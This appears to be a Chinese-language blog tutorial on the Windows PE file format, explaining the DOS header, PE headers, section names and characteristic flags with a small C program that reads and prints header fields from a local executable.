<p>PE（Portable Execute）文件是 Windows 下可移植、可执行文件的总称，常见的有 DLL，EXE，OCX，SYS，COM 等都是 PE 文件，PE 文件是微软 Windows 操作系统上的程序文件（可能是间接被执行，如 DLL）。</p>
<p>而事实上，一个文件是否是 PE 文件与其扩展名无关，PE 文件可以是任何扩展名。</p>
<p>PE 文件的结构一般来说如下图所示：从起始位置开始依次是 MS-DOS 头，标准 PE 头，扩展 PE 头，数据目录，以及节表。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213055508431.png" alt="image-20220213055508431" /></p>
<h2 id="ms-dos"><a class="anchor" href="#ms-dos">#</a> MS-DOS</h2>
<p>使用 010 打开一个 exe 文件可以看到 MS-DOS 头</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213061241744.png" alt="image-20220213061241744" /></p>
<p>MS-DOS 头出于兼容性的目的而存在，主要是为了防止 PE 文件运行在 MS-DOS 系统下出现错误。</p>
<h3 id="ms-dos头结构"><a class="anchor" href="#ms-dos头结构">#</a> MS-DOS 头结构</h3>
<p>通过 <code>_IMAGE_DOS_HEADER</code>  结构体读取我们所要的 MS-DOS 头</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213062739666.png" alt="image-20220213062739666" /></p>
<p>MS-DOS 标识：4D5A</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213062943734.png" alt="image-20220213062943734" /></p>
<p>头标志判断是否为 MS-DOS 头</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213063119930.png" alt="image-20220213063119930" /></p>
<p>指向新的 PE 头</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213063158508.png" alt="image-20220213063158508" /></p>
<h3 id="读取程序"><a class="anchor" href="#读取程序">#</a> 读取程序</h3>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	FILE <span class="token operator">*</span> pFile <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	<span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	<span class="token keyword">int</span> nFileLength <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	pFile <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"C:\\Users\\21r000\\Desktop\\PE编辑器\\PEditor.exe"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	<span class="token function">fseek</span><span class="token punctuation">(</span>pFile<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">SEEK_END</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	nFileLength <span class="token operator">=</span> <span class="token function">ftell</span><span class="token punctuation">(</span>pFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token function">rewind</span><span class="token punctuation">(</span>pFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	<span class="token keyword">int</span> imageLength <span class="token operator">=</span> nFileLength <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>	buffer <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>imageLength<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>	<span class="token function">memset</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> nFileLength <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>	<span class="token function">fread</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> imageLength<span class="token punctuation">,</span> pFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre>	<span class="token comment">//_IMAGE_DOS_HEADER</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	PIMAGE_DOS_HEADER ReadDosHeader<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	ReadDosHeader <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>buffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"MS-DOS Info:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"MZ标志位：%x\n"</span><span class="token punctuation">,</span> ReadDosHeader<span class="token operator">-></span>e_magic<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"PE头偏移：%x\n"</span><span class="token punctuation">,</span> ReadDosHeader<span class="token operator">-></span>e_lfanew<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre></pre></td></tr><tr><td data-num="25"></td><td><pre>	<span class="token function">free</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h3 id="运行结果"><a class="anchor" href="#运行结果">#</a> 运行结果</h3>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213065944374.png" alt="image-20220213065944374" /></p>
<h3 id="报错"><a class="anchor" href="#报错">#</a> 报错</h3>
<pre><code class="language-ABAP">1&gt;c:\users\21r000\source\repos\project3\project3\pe.cpp(9): error C4996: 'fopen': This function or variable may be unsafe. Consider using fopen_s instead. To disable deprecation, use _CRT_SECURE_NO_WARNINGS. See online help for details.
</code></pre>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213065505363.png" alt="image-20220213065505363" /></p>
<h4 id="解决方法"><a class="anchor" href="#解决方法">#</a> 解决方法</h4>
<pre><code class="language-ABAP">项目-&gt;XX属性-&gt;C++-&gt;预处理器-&gt;在预处理器定义添加“_CRT_SECURE_NO_WARNINGS”
</code></pre>
<p>具体操作如图：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213065712939.png" alt="image-20220213065712939" /></p>
<p>添加 <code>_CRT_SECURE_NO_WARNINGS</code>  即可</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213065851431.png" alt="image-20220213065851431" /></p>
<h2 id="pe头"><a class="anchor" href="#pe头">#</a> PE 头</h2>
<h3 id="pe头结构"><a class="anchor" href="#pe头结构">#</a> PE 头结构</h3>
<p>PE 头分为：</p>
<ul>
<li>标准 PE 头：每一个 PE 文件中都有。</li>
<li>扩展 PE 头：可有可无。</li>
</ul>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213071122271.png" alt="image-20220213071122271" /></p>
<p><code>_IMAGE_NT_HEADERS</code> ，分为 32 位和 64 位两个版本，根据逆向解析的程序使用相应的版本。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213070757581.png" alt="image-20220213070757581" /></p>
<p>PE 标识：5045</p>
<p><code>IMAGE_FILE_HEADER</code>  定义</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213071611782.png" alt="image-20220213071611782" /></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>WORD    Machine<span class="token punctuation">;</span>                <span class="token comment">// 可以运行在什么样的 CPU 上 任意：0 Intel 386 以及后续：14C x64：8864</span></pre></td></tr><tr><td data-num="2"></td><td><pre>WORD    NumberOfSections<span class="token punctuation">;</span>       <span class="token comment">// 表示节的数量</span></pre></td></tr><tr><td data-num="3"></td><td><pre>DWORD   TimeDateStamp<span class="token punctuation">;</span>          <span class="token comment">// 编译器填写的时间戳，与文件属性里面的创建时间、修改时间无关</span></pre></td></tr><tr><td data-num="4"></td><td><pre>DWORD   PointerToSymbolTable<span class="token punctuation">;</span>   <span class="token comment">// 调试相关</span></pre></td></tr><tr><td data-num="5"></td><td><pre>DWORD   NumberOfSymbols<span class="token punctuation">;</span>        <span class="token comment">// 调试相关</span></pre></td></tr><tr><td data-num="6"></td><td><pre>WORD    SizeOfOptionalHeader<span class="token punctuation">;</span>   <span class="token comment">// 可选 PE 头的大小 (32 位 PE 文件：0xE0 64 位 PE 文件：0xF0)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>WORD    Characteristics<span class="token punctuation">;</span>        <span class="token comment">// 文件属性</span></pre></td></tr></table></figure><table>
<thead>
<tr>
<th style="text-align:left">成员</th>
<th style="text-align:left">大小 (十进制)</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Machine</td>
<td style="text-align:left">2 字节</td>
</tr>
<tr>
<td style="text-align:left">NumberOfSections</td>
<td style="text-align:left">2 字节</td>
</tr>
<tr>
<td style="text-align:left">TimeDateStamp</td>
<td style="text-align:left">4 字节</td>
</tr>
<tr>
<td style="text-align:left">PointerToSymbolTable</td>
<td style="text-align:left">4 字节</td>
</tr>
<tr>
<td style="text-align:left">NumberOfSymbols</td>
<td style="text-align:left">4 字节</td>
</tr>
<tr>
<td style="text-align:left">SizeOfOptionalHeader</td>
<td style="text-align:left">2 字节</td>
</tr>
<tr>
<td style="text-align:left">Characteristics</td>
<td style="text-align:left">2 字节</td>
</tr>
</tbody>
</table>
<p>宏定义：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213071509571.png" alt="image-20220213071509571" /></p>
<p>通过 PE 编辑器可以查看文件信息，从而便于编写程序</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213071746220.png" alt="image-20220213071746220" /></p>
<h3 id="常用区段"><a class="anchor" href="#常用区段">#</a> 常用区段</h3>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">.</span>text <span class="token punctuation">.</span>code <span class="token comment">// 代码段</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>data <span class="token comment">// 可读写数据段，存放全局变量和 C 盘变量</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">.</span>rdata <span class="token comment">// 只读数据段</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">.</span>idata <span class="token comment">// 导入数据段</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">.</span>edata <span class="token comment">// 导出数据段</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">.</span>rsrc <span class="token comment">// 资源段</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">.</span>bss <span class="token comment">// 未初始化数据</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">.</span>crt <span class="token comment">// 用于 C++ 运行时 (CRT) 所添加的数据</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">.</span>tls <span class="token comment">// 线程局部存储器，这包括数据的初始化值，也包括运行时所需要的额外变量</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token punctuation">.</span>reloc <span class="token comment">// 可执行文件的基址重定位</span></pre></td></tr></table></figure><h3 id="常见pe属性"><a class="anchor" href="#常见pe属性">#</a> 常见 PE 属性</h3>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213073745540.png" alt="image-20220213073745540" /></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_RELOCS_STRIPPED</span>           <span class="token expression"><span class="token number">0x0001</span>  </span><span class="token comment">// Relocation info stripped from file.</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_EXECUTABLE_IMAGE</span>          <span class="token expression"><span class="token number">0x0002</span>  </span><span class="token comment">// File is executable  (i.e. no unresolved external references).</span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_LINE_NUMS_STRIPPED</span>        <span class="token expression"><span class="token number">0x0004</span>  </span><span class="token comment">// Line nunbers stripped from file.</span></span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_LOCAL_SYMS_STRIPPED</span>       <span class="token expression"><span class="token number">0x0008</span>  </span><span class="token comment">// Local symbols stripped from file.</span></span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_AGGRESIVE_WS_TRIM</span>         <span class="token expression"><span class="token number">0x0010</span>  </span><span class="token comment">// Aggressively trim working set</span></span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_LARGE_ADDRESS_AWARE</span>       <span class="token expression"><span class="token number">0x0020</span>  </span><span class="token comment">// App can handle >2gb addresses</span></span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_BYTES_REVERSED_LO</span>         <span class="token expression"><span class="token number">0x0080</span>  </span><span class="token comment">// Bytes of machine word are reversed.</span></span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_32BIT_MACHINE</span>             <span class="token expression"><span class="token number">0x0100</span>  </span><span class="token comment">// 32 bit word machine.</span></span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_DEBUG_STRIPPED</span>            <span class="token expression"><span class="token number">0x0200</span>  </span><span class="token comment">// Debugging info stripped from file in .DBG file</span></span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP</span>   <span class="token expression"><span class="token number">0x0400</span>  </span><span class="token comment">// If Image is on removable media, copy and run from the swap file.</span></span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_NET_RUN_FROM_SWAP</span>         <span class="token expression"><span class="token number">0x0800</span>  </span><span class="token comment">// If Image is on Net, copy and run from the swap file.</span></span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_SYSTEM</span>                    <span class="token expression"><span class="token number">0x1000</span>  </span><span class="token comment">// System File.</span></span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_DLL</span>                       <span class="token expression"><span class="token number">0x2000</span>  </span><span class="token comment">// File is a DLL.</span></span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_UP_SYSTEM_ONLY</span>            <span class="token expression"><span class="token number">0x4000</span>  </span><span class="token comment">// File should only be run on a UP machine</span></span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_BYTES_REVERSED_HI</span>         <span class="token expression"><span class="token number">0x8000</span>  </span><span class="token comment">// Bytes of machine word are reversed.</span></span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_UNKNOWN</span>           <span class="token expression"><span class="token number">0</span></span></span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_TARGET_HOST</span>       <span class="token expression"><span class="token number">0x0001</span>  </span><span class="token comment">// Useful for indicating we want to interact with the host and not a WoW guest.</span></span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_I386</span>              <span class="token expression"><span class="token number">0x014c</span>  </span><span class="token comment">// Intel 386.</span></span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_R3000</span>             <span class="token expression"><span class="token number">0x0162</span>  </span><span class="token comment">// MIPS little-endian, 0x160 big-endian</span></span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_R4000</span>             <span class="token expression"><span class="token number">0x0166</span>  </span><span class="token comment">// MIPS little-endian</span></span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_R10000</span>            <span class="token expression"><span class="token number">0x0168</span>  </span><span class="token comment">// MIPS little-endian</span></span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_WCEMIPSV2</span>         <span class="token expression"><span class="token number">0x0169</span>  </span><span class="token comment">// MIPS little-endian WCE v2</span></span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_ALPHA</span>             <span class="token expression"><span class="token number">0x0184</span>  </span><span class="token comment">// Alpha_AXP</span></span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_SH3</span>               <span class="token expression"><span class="token number">0x01a2</span>  </span><span class="token comment">// SH3 little-endian</span></span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_SH3DSP</span>            <span class="token expression"><span class="token number">0x01a3</span></span></span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_SH3E</span>              <span class="token expression"><span class="token number">0x01a4</span>  </span><span class="token comment">// SH3E little-endian</span></span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_SH4</span>               <span class="token expression"><span class="token number">0x01a6</span>  </span><span class="token comment">// SH4 little-endian</span></span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_SH5</span>               <span class="token expression"><span class="token number">0x01a8</span>  </span><span class="token comment">// SH5</span></span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_ARM</span>               <span class="token expression"><span class="token number">0x01c0</span>  </span><span class="token comment">// ARM Little-Endian</span></span></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_THUMB</span>             <span class="token expression"><span class="token number">0x01c2</span>  </span><span class="token comment">// ARM Thumb/Thumb-2 Little-Endian</span></span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_ARMNT</span>             <span class="token expression"><span class="token number">0x01c4</span>  </span><span class="token comment">// ARM Thumb-2 Little-Endian</span></span></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_AM33</span>              <span class="token expression"><span class="token number">0x01d3</span></span></span></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_POWERPC</span>           <span class="token expression"><span class="token number">0x01F0</span>  </span><span class="token comment">// IBM PowerPC Little-Endian</span></span></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_POWERPCFP</span>         <span class="token expression"><span class="token number">0x01f1</span></span></span></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_IA64</span>              <span class="token expression"><span class="token number">0x0200</span>  </span><span class="token comment">// Intel 64</span></span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_MIPS16</span>            <span class="token expression"><span class="token number">0x0266</span>  </span><span class="token comment">// MIPS</span></span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_ALPHA64</span>           <span class="token expression"><span class="token number">0x0284</span>  </span><span class="token comment">// ALPHA64</span></span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_MIPSFPU</span>           <span class="token expression"><span class="token number">0x0366</span>  </span><span class="token comment">// MIPS</span></span></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_MIPSFPU16</span>         <span class="token expression"><span class="token number">0x0466</span>  </span><span class="token comment">// MIPS</span></span></pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_AXP64</span>             <span class="token expression">IMAGE_FILE_MACHINE_ALPHA64</span></span></pre></td></tr><tr><td data-num="41"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_TRICORE</span>           <span class="token expression"><span class="token number">0x0520</span>  </span><span class="token comment">// Infineon</span></span></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_CEF</span>               <span class="token expression"><span class="token number">0x0CEF</span></span></span></pre></td></tr><tr><td data-num="43"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_EBC</span>               <span class="token expression"><span class="token number">0x0EBC</span>  </span><span class="token comment">// EFI Byte Code</span></span></pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_AMD64</span>             <span class="token expression"><span class="token number">0x8664</span>  </span><span class="token comment">// AMD64 (K8)</span></span></pre></td></tr><tr><td data-num="45"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_M32R</span>              <span class="token expression"><span class="token number">0x9041</span>  </span><span class="token comment">// M32R little-endian</span></span></pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_ARM64</span>             <span class="token expression"><span class="token number">0xAA64</span>  </span><span class="token comment">// ARM64 Little-Endian</span></span></pre></td></tr><tr><td data-num="47"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_CEE</span>               <span class="token expression"><span class="token number">0xC0EE</span></span></span></pre></td></tr></table></figure><p><code>typedef struct _IMAGE_OPTIONAL_HEADER</code>  定义</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213074527728.png" alt="image-20220213074527728" /></p>
<p>AddressOfEntryPoint：程序入口，当前 PE 文件从哪个位置开始执行，配合 ImageBase (内存镜像基址) 来看</p>
<ul>
<li>VA：Virtual Adress 00000000h-0fffffffh 进程的基地址 + 相对虚拟内存地址</li>
<li>RVA ：Reversc Virtual Adress 相对虚拟内存地址 针对某一个模块而存在</li>
<li>FOA：File Offset Address 文件偏移地址</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:left">成员</th>
<th style="text-align:left">大小 (十进制)</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Magic</td>
<td style="text-align:left">2 字节</td>
<td style="text-align:left">PE32：10B、PE32+(64)：20B，可以用来确认是 32 位还是 64 位程序</td>
</tr>
<tr>
<td style="text-align:left">MajorLinkerVersion</td>
<td style="text-align:left">1 字节</td>
<td style="text-align:left">链接器版本号</td>
</tr>
<tr>
<td style="text-align:left">MinorLinkerVersion</td>
<td style="text-align:left">1 字节</td>
<td style="text-align:left">链接器版本号</td>
</tr>
<tr>
<td style="text-align:left">SizeOfCode</td>
<td style="text-align:left">4 字节</td>
<td style="text-align:left">所有代码节的总和，文件对齐后的大小，由编译器填写</td>
</tr>
<tr>
<td style="text-align:left">SizeOfInitializedData</td>
<td style="text-align:left">4 字节</td>
<td style="text-align:left">包含所有已经初始化数据的节的总大小，文件对齐后的大小，由编译器填写</td>
</tr>
<tr>
<td style="text-align:left">AddressOfEntryPoint</td>
<td style="text-align:left">4 字节</td>
<td style="text-align:left">程序入口，当前 PE 文件从哪个位置开始执行，配合 ImageBase (内存镜像基址) 来看</td>
</tr>
</tbody>
</table>
<h3 id="执行程序"><a class="anchor" href="#执行程序">#</a> 执行程序</h3>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213075850476.png" alt="image-20220213075850476" /></p>
